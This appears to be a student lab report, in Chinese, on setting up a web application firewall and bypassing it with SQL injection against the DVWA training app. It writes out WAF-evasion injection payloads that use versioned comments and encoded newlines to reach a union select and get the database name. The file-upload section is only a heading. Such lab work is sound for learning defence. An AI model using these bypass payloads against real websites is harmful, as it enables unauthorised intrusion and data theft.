---
typora-root-url: ./
---

## 1.实现 WAF 安装与配置。

按照文档安装配置完后进行测试

![1](/1.png)

WAF成功拦截

![2](/2.png)

## 2.WAF 绕过 SQL 注入

- ## 分别在无 WAF 和有 WAF 的情况下，利用 SQLMap 进行注入，提供注入结果截图。

  无WAF利用Sqlmap进行注入的结果

  ![3](/3.png)

  有WAF利用Sqlmap进行注入的结果

  ![4](/4.png)

- ## 在有 WAF 的情况下，手工注入出 DVWA 数据库中的 user 和 password，提供注入过程说明文档。

  通过输入1' group by 2#得到查询列数为两列

  通过输入-1' regexp "%0A%23" /*!44977union %0A select */ 1,2-- 得到数据回显

  通过输入-1' regexp "%0A%23" /*!44977union %0A select */ 1, database( %0A /*!44977)*/ -- 得到数据库dvwa

  

  

## 3.WAF 绕过文件上传：判断安全狗对于上传文件的检测规则，是基于文件后缀名、文件类型、文件内容中的哪项来进行匹配拦截，给出推导过程。